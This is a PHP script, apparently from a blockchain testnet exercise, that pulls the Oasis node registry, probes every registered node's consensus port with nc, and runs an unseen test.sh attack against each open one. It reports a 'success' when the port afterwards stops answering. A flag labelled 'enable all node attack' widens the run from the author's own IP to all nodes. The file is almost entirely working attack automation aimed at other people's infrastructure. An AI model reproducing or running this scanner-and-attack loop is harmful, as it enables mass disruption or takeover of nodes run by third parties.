<?php
//enable all node attack
$hack = 1;
//list of debug port
$port_list = ["42261"];
//web <br> or console \n
$br="\n";

//retrieve port list
//ssh instance-1.us-central1-a.golden-totality-238500 "/home/oasis/bin/oasis-node registry node list -v" -a unix:/serverdir/node/internal.sock
$cmd = "wget -O - http://oasis/node_list.php 2>/dev/null";
echo "command:".$cmd.$br;
$node_list_json = shell_exec( $cmd );
$node_json_list = explode ("\n" , $node_list_json);
$target_list = array();
$up_list = array();

function check_up($ip, $ip_port){
	//$cmd = "nmap -Pn -p $ip_port $ip | grep $ip_port | grep open";
	$cmd = "nc $ip $ip_port -w 1 | wc -c";
	$result = shell_exec( $cmd );
	if (intval($result) == 34){
		return 1;
	}
	return 0;
}

//get target list from node list (debug port open)
foreach ($node_json_list as $node_json){
	$node = json_decode($node_json);
	if ($node){
		//var_dump($node);
		
		foreach($node->consensus->addresses as $address){
			//echo "==>".$address.$br;
			$ip = explode(":",explode ("@" , $address)[1])[0];
			$ip_port = explode(":",explode ("@" , $address)[1])[1];		
			
			if ($hack || $ip == "35.223.20.90" /* my ip */){
				echo "Id:".$node->id.$br;
				echo "==>".$ip.':'.$ip_port.$br;

				if (check_up($ip, $ip_port)){
					echo "== ".$ip_port." open".$br;
					array_push($up_list, $ip.":".$ip_port);
					array_push($target_list, [$ip, $ip_port]);
				}else{
					echo "== ".$ip_port." close".$br;
				}
				/*
				foreach($port_list as $port){
					$cmd = "nmap -Pn -p $port $ip | grep $port | grep open";
					$result = shell_exec( $cmd );
					if ($result){
						echo "== ".$port." open".$br;
						array_push($target_list, $ip.":".$port);
					}else{
						echo "== ".$port." close".$br;
					}
					//sleep(1);
				}
				*/
			}	
		}
	}
}

$success_list = array();
if (count($target_list)){
	echo "Testing ".count($target_list)." targets: ".$br;
	foreach ($target_list as $target){
		echo "test node ".$target[0].":".$target[1].$br;;
		$cmd = "./test.sh ".$target[0]." ".$target[1];
		echo "==> ".$cmd.$br;
		exec ( $cmd , $output , $return_var );
		if ($return_var == 0){
			echo "==> node control process on : ".$target[0].":".$target[1].$br;
		}else{
			echo "==> node control error on : ".$target[0].":".$target[1].$br;
		}	
		sleep(5);
		if (check_up($target[0], $target[1])){
			echo "==> node control fail on : ".$target[0].":".$target[1].$br;
		}else{
			echo "==> node control success on : ".$target[0].":".$target[1].$br;
			array_push($success_list, $target);
		}
	}
} else {
	echo "no target with open port".$br;
}


if (count($success_list)){
	echo "list of ".count($success_list)." successs : ".$br;
	foreach ($success_list as $target){
		echo "success : ".$target[0].":".$target[1].$br;
	}
} else {
	echo "no target success".$br;
}

echo "result : ".count($node_json_list)." nodes registered with ".count($up_list)." nodes up and ".count($success_list)." success".$br

?>
